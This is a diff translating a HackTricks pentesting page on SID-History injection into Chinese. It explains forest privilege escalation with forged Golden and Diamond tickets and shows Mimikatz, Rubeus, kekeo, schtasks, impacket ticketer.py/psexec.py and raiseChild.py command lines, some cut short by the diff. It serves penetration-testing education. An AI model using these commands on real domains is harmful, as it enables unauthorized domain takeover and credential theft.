@@ -1,34 +1,32 @@
-# SID-History Injection
+# SID-History注入
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
 
 </details>
 
-## Attack
+## 攻击
 
-SID History was designed to support migration scenarios, where a user would be moved from one domain to another. To preserve access to resources in the "old" domain, the **user's previous SID would be added to the SID History** of their new account. So when creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will **grant access to all resources in the parent**.
+SID History旨在支持迁移场景，其中用户将从一个域移动到另一个域。为了保留对“旧”域中资源的访问权限，**用户的先前SID将被添加到其新帐户的SID History中**。因此，当创建这样的票证时，可以添加父域中特权组（EAs、DAs等）的SID，这将**授予对父域中所有资源的访问权限**。
 
-This can be achieved using either a [**Golden**](sid-history-injection.md#golden-ticket) or [**Diamond Ticket**](sid-history-injection.md#diamond-ticket).
+这可以通过使用[**Golden票证**](sid-history-injection.md#golden-ticket)或[**Diamond票证**](sid-history-injection.md#diamond-ticket)来实现。
 
-For finding the **SID** of the **"Enterprise Admins"** group you can find the **SID** of the **root domain** and set it in `S-1-5-21-<root domain>-519`. For example, from root domain SID `S-1-5-21-280534878-1496970234-700767426` the **"Enterprise Admins"** group SID is `S-1-5-21-280534878-1496970234-700767426-519`
+要找到**"Enterprise Admins"**组的**SID**，可以找到**根域**的**SID**并将其设置为`S-1-5-21-<root domain>-519`。例如，从根域SID `S-1-5-21-280534878-1496970234-700767426`，**"Enterprise Admins"**组的SID是`S-1-5-21-280534878-1496970234-700767426-519`。
 
-You could also use the **Domain Admins** groups, which ends in **512**.
+您还可以使用**Domain Admins**组，其以**512**结尾。
 
-Another way yo find the SID of a group of the other domain (for example "Domain Admins") is with:
-
+另一种找到其他域的组（例如"Domain Admins"）的SID的方法是：
 ```powershell
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
-
-### Golden Ticket (Mimikatz) with KRBTGT-AES256
+### 使用KRBTGT-AES256的黄金票据（Mimikatz）
 
 {% code overflow="wrap" %}
 ```bash
@@ -49,13 +47,13 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 ```
 {% endcode %}
 
-For more info about golden tickets check:
+有关黄金票据的更多信息，请查看：
 
 {% content-ref url="golden-ticket.md" %}
 [golden-ticket.md](golden-ticket.md)
 {% endcontent-ref %}
 
-### Diamond Ticket (Rubeus + KRBTGT-AES256)
+### 钻石票据（Rubeus + KRBTGT-AES256）
 
 {% code overflow="wrap" %}
 ```powershell
@@ -69,7 +67,7 @@ Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_s
 ```
 {% endcode %}
 
-For more info about diamond tickets check:
+有关钻石票的更多信息，请查看：
 
 {% content-ref url="diamond-ticket.md" %}
 [diamond-ticket.md](diamond-ticket.md)
@@ -77,13 +75,13 @@ For more info about diamond tickets check:
 
 {% code overflow="wrap" %}
 ```bash
-.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local 
+.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
 {% endcode %}
 
-Escalate to DA of root or Enterprise admin using the KRBTGT hash of the compromised domain:
+使用被入侵域的KRBTGT哈希提升为根或企业管理员： 
 
 {% code overflow="wrap" %}
 ```bash
@@ -99,15 +97,15 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
 {% endcode %}
 
-With the acquired permissions from the attack you can execute for example a DCSync attack in the new domain:
+通过攻击获得的权限，您可以在新域中执行例如DCSync攻击：
 
 {% content-ref url="dcsync.md" %}
 [dcsync.md](dcsync.md)
 {% endcontent-ref %}
 
-### From linux
+### 从Linux开始
 
-#### Manual with [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
+#### 使用[ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)手动操作
 
 {% code overflow="wrap" %}
 ```bash
@@ -124,34 +122,32 @@ ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_doma
 # JUST USE THE SAME USERNAME IN THE NEXT STEPS
 
 # Load ticket
-export KRB5CCNAME=hacker.ccache 
+export KRB5CCNAME=hacker.ccache
 
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
 {% endcode %}
 
-#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### 使用[raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)自动化
 
-This is an Impacket script which will **automate escalating from child to parent domain**. The script needs:
+这是一个Impacket脚本，可以**自动从子域升级到父域**。脚本需要：
 
-* Target domain controller
-* Creds for an admin user in the child domain
+* 目标域控制器
+* 子域中管理员用户的凭证
 
-The flow is:
+流程如下：
 
-* Obtains the SID for the Enterprise Admins group of the parent domain
-* Retrieves the hash for the KRBTGT account in the child domain
-* Creates a Golden Ticket
-* Logs into the parent domain
-* Retrieves credentials for the Administrator account in the parent domain
-* If the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.
-
+* 获取父域的Enterprise Admins组的SID
+* 检索子域中KRBTGT帐户的哈希值
+* 创建一个Golden Ticket
+* 登录到父域
+* 检索父域中Administrator帐户的凭证
+* 如果指定了`target-exec`开关，则通过Psexec验证到父域的域控制器。
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
-
-## References
+## 参考资料
 
 * [https://studylib.net/doc/25696115/crto](https://studylib.net/doc/25696115/crto)
 
@@ -159,10 +155,10 @@ raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
 
 </details>
